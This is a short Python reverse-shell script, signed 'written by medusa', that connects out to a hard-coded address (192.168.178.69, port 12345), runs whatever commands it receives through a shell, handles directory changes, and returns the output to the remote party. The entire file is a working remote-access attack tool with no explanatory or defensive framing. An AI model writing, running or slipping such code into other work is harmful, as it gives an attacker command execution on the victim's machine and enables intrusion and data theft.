#  written by medusa


import socket
import subprocess
import os


def shell(host, port=12345):
    client = socket.socket()

    try:
        client.connect((host, port))

        while True:
            command = client.recv(1024)
            if not command:
                break

            command = command.decode()

            if command.startswith('cd '):
                directory = command[3:]
                os.chdir(directory)

            else:
                op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read()
                output_error = op.stderr.read()
                response = output + output_error
                
            if client.send(response):
                pass
            else:
                client.send(bytes([0]))

    except Exception as e:
        exit()

    finally:
        client.close()


if __name__ == "__main__":
    shell("192.168.178.69", 12345)
